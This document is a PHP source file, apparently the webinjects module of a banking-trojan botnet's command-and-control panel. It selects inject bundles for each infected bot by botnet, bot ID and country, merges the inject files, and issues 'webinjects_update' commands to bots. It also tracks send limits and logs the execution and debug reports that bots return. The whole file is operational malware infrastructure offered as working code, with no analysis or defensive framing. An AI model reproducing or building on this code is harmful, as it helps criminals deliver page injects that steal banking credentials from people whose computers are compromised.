<?php
define('GP_WEBINJECTS_SCRIPT_EID', '([WEBINJECT])'); # Script external ID prefix that's used to tell WebInject scripts apart
define('GP_WEBINJECTS_SCRIPTS_PATH', 'webinjects'); # Scripts path in files/

/** Send webinjects for the current bot: generate script-like entries
 * @param string    $botnet The current bot's botnet string
 * @param string    $botid The current bot's ID
 * @param string    $country
 * @return array( 'extern_id' => 'script_bin' )
 */
function gate_plugin_webinjects_send($botnet, $botid, $country){
	# Get the bundles
	$botnetQ = mysql_real_escape_string($botnet);
	$botidQ = mysql_real_escape_string($botid);
	$countryQ = mysql_real_escape_string($country);

	# Fast check: are there any bundle updates since this bot has received anything
	$r_news = mysql_query(
		"SELECT MAX(`b`.`mtime`) > MAX(`h`.`etime`) OR MAX(`h`.`etime`) IS NULL
		 FROM `botnet_webinjects_history` `h`, `botnet_webinjects_bundle` `b`
		 WHERE `h`.`botid` = '$botidQ'
		 ;");
	if (!$r_news)
		return trigger_error('Error checking for fast updates: '.mysql_error(), E_USER_WARNING);
	$news = mysql_result($r_news, 0, 0);

	GATE_DEBUG_MODE && GateLog::get()->log(GateLog::L_TRACE, 'plugin.webinjects', 'Have any new campaigns: '.($news? 'true' : 'false'));

	if (!$news)
		return true; # nothing interesting has happened :)

	# Get all bundles if any was updated
	$r_bundles = mysql_query(
		"SELECT
		    `b`.`bid`,
		    `b`.`mtime`,
		    `b`.`exec_mode`,
		    `b`.`exec_sendlimit`,
		    (`h`.`etime` IS NULL OR `b`.`mtime` > `h`.`etime`) AS `b_updated`
		 FROM `botnet_webinjects_bundle` `b`
		    CROSS JOIN `botnet_webinjects_bundle_execlim` `be_bn` ON(`b`.`bid` = `be_bn`.`bid` AND `be_bn`.`name`='botnet')
		    CROSS JOIN `botnet_webinjects_bundle_execlim` `be_bi` ON(`b`.`bid` = `be_bi`.`bid` AND `be_bi`.`name`='botid')
		    CROSS JOIN `botnet_webinjects_bundle_execlim` `be_cn` ON(`b`.`bid` = `be_cn`.`bid` AND `be_cn`.`name`='country')
		    LEFT JOIN `botnet_webinjects_history` `h` ON(`b`.`bid` = `h`.`bid` AND `h`.`botid` = '$botidQ' AND `h`.`exec_error` IS NULL)
		 WHERE
		    (`b`.`state` = 'on') AND
		    (`be_bn`.`val` IS NULL OR `be_bn`.`val` = '$botnetQ') AND
		    (`be_bi`.`val` IS NULL OR `be_bi`.`val` = '$botidQ') AND
		    (`be_cn`.`val` IS NULL OR `be_cn`.`val` = '$countryQ') AND
		    /*(`h`.`etime` IS NULL OR `b`.`mtime` > `h`.`etime`) AND -- else I get only it and not all bundles I match */
		    (`b`.`exec_sendlimit` IS NULL OR `b`.`exec_sendlimit` > 0)
		 GROUP BY
		    `b`.`bid`
		 ORDER BY
		    `b`.`one_iid` IS NULL DESC,
		    `b`.`bid` ASC
		 ;");
	if (!$r_bundles)
		return trigger_error('Error matching webinject-bundles: '.mysql_error(), E_USER_WARNING);

	# Check whether we have anything here
	$matching_bundles = mysql_num_rows($r_bundles);
	if ($matching_bundles == 0)
		return true;

	# Process the result set only if at least one bundle was updated. If not - discard the whole result set
	$bundles = array();
	$news = false;
	while (!is_bool($bundle = mysql_fetch_object($r_bundles))){
		$bundles[] = $bundle;
		$news |= $bundle->b_updated;
	}

	GATE_DEBUG_MODE && GateLog::get()->log(GateLog::L_TRACE, 'plugin.webinjects', 'Found '.count($bundles).', '.($news? 'have updates' : 'have no updates'));

	if (!$news)
		return true;

	# Prepare the data necessary for the script
	$script = new stdClass;
	$script->bids = array(); # Bundle IDs (bid) merged here
	$script->mtime = 0; # Max bundles mtime
	$script->mode = array(); # Script mode to use
	$script->extern_id = substr(GP_WEBINJECTS_SCRIPT_EID.rand(10000000000,99999999999), 0, 16); # Script external ID. The prefix is used to tell WebInject scripts apart. Does not matter at all.
	$script->command = 'webinjects_update %s "%s"'; # Script command: %s=mode %s=file
	$script->file_name = ''; # Merged inject file name
	$script->file_path = ''; # Merged inject file full path
	$script->file_uri = ''; # Merged inject file URI
	$script->update_sendlimits = false; # Whether any of the bundles have a sendlimit to decrement

	# Read the bundles info
	foreach ($bundles as $bundle){
		$script->mode[] = $bundle->exec_mode; # Collect all modes
		$script->bids[] = $bundle->bid;
		if ($bundle->mtime > $script->mtime)
			$script->mtime = $bundle->mtime;
		if ($bundle->exec_sendlimit !== null && $bundle->exec_sendlimit !== 0)
			$script->update_sendlimits = true;
	}
	$bundle_ids = implode(',', $script->bids); # used widely, so cached here

    # Pick the most 'tight' mode for this bot
    # The idea is: mostly, 'dual' is used. However, for some bots we wish to override it with 'single'. Additionally, for a few bots we'd like to use 'disabled'
    foreach (array('disabled', 'single', 'dual') as $m) # iteratively search by priority: if any - then all
        if (in_array($m, $script->mode)){
            $script->mode = $m;
            break;
        }
    if (is_array($script->mode)) # nothing found
        $script->mode = array_shift($script->mode); # pick the first one

	# Read|Generate the file
	$script->file_name = GP_WEBINJECTS_SCRIPTS_PATH.'/merged-'.implode('-', $script->bids).'.txt';
	$script->file_path = 'files/'.$script->file_name;
    $script->file_uri = 'webinjects/'.basename($script->file_name);

	if (!file_exists($script->file_path) || filemtime($script->file_path) < $script->mtime){
		GATE_DEBUG_MODE && GateLog::get()->log(GateLog::L_TRACE, 'plugin.webinjects', sprintf("Creating the merged file %s", $script->file_path));

		# Read & merge the webinjects
		$webinjects = '';
		foreach ($script->bids as $bid){
			$bundle_content = file_get_contents(sprintf('%s/%s.txt', $bundle_content_file = 'files/'.GP_WEBINJECTS_SCRIPTS_PATH, $bid));
			if ($bundle_content === FALSE)
				return trigger_error('Error reading bundle #'.$bid.' contents file "'.$bundle_content_file.'"', E_USER_WARNING);
			$webinjects .= $bundle_content."\r\n";
		}

		# Write 'em to the file
		$f = fopen($script->file_path, 'w');
		if (!$f)
			return trigger_error('Error writing merged webinject-bundles file: "'.$script->file_path.'"', E_USER_WARNING);
		flock($f, LOCK_EX);
		fwrite($f, $webinjects);
		flock($f, LOCK_UN);
		fclose($f);
	}

	# Prepare the execution
	$script->command = sprintf($script->command, $script->mode, $script->file_uri);
	GateLog::get()->log(GateLog::L_INFO, 'plugin.webinjects', sprintf("Script: Load bundles [%s] with: `%s`", $bundle_ids, $script->command));

	# Log the execution history for each participating bundle
	$values = array();
	foreach ($script->bids as $bid)
		$values[] = "($bid, '$botidQ')";

	$q = 'INSERT INTO `botnet_webinjects_history` (`bid`, `botId`) VALUES '.implode(',', $values)
		.' ON DUPLICATE KEY UPDATE `etime`=NULL, `exec_error`=NULL, `debug_error`=NULL;';
	if (!mysql_query($q))
		return trigger_error('Error logging webinjects history: '.mysql_error(), E_USER_WARNING);

	# Update the sendlimit (if not NULL) for each participating bundle
	if ($script->update_sendlimits){
		$q = 'UPDATE `botnet_webinjects_bundle` `b` '
			.'SET `exec_sendlimit` = `exec_sendlimit`-1 '
			.'WHERE (`b`.`exec_sendlimit` IS NULL OR `b`.`exec_sendlimit` > 0) AND `bid` IN('.$bundle_ids.')'
			.';';
		if (!mysql_query($q))
			return trigger_error('Error updating webinject-bundles\' sendlimits: '.mysql_error(), E_USER_WARNING);
	}

	# Send the script
	return array($script->extern_id => $script->command);
}



/** Handle an incoming script execution report.
 * When EID starts with GP_WEBINJECTS_SCRIPT_EID, the execution report belongs to us and we handle it.
 * When handled, return `true` and it won't proceed to the generic script execution handler
 * @param string $botId
 * @param string $eid
 * @param bool $success
 * @param string $result
 * @return bool
 */
function gate_plugin_webinjects_onscript($botId, $eid, $success, $result){
	if (strncmp($eid, GP_WEBINJECTS_SCRIPT_EID, strlen(GP_WEBINJECTS_SCRIPT_EID)) !== 0)
		return false;

	# Log
	GateLog::get()->log(GateLog::L_INFO, 'plugin.webinjects', sprintf("Webinjects load script report: success=%s, result=%s", $success, $result));

	# Log the execution history
	$q = 'UPDATE `botnet_webinjects_history` '
		.'SET `etime`='.time().', `exec_count`=COALESCE(`exec_count`,0)+1, `exec_error`='.($success? 'NULL' : '"'.mysql_real_escape_string($result).'"').' '
		.'WHERE `botId`="'.mysql_real_escape_string($botId).'" '
		.';';
	if (!mysql_query($q))
		return trigger_error('Error saving the webinjects execution history: '.mysql_error(), E_USER_WARNING);

	return true;
}


/** Handle an incoming DEBUG report for the WebInjects module
 * @param string $botId
 * @param string $path_source
 * @param string $context
 */
function gate_plugin_webinjects_onreport($botId, $path_source, $context){

    if (strpos($context, 'Type: SUCCESS') !== FALSE)
        return; // all ok

	$q = 'UPDATE `botnet_webinjects_history`'
		.'SET `debug_error`="'.mysql_real_escape_string($context).'" '
		.'WHERE `botId`="'.mysql_real_escape_string($botId).'" '
		.';';
	if (!mysql_query($q))
		trigger_error('Error storing the webinjects debug log: '.mysql_error(), E_USER_WARNING);
}
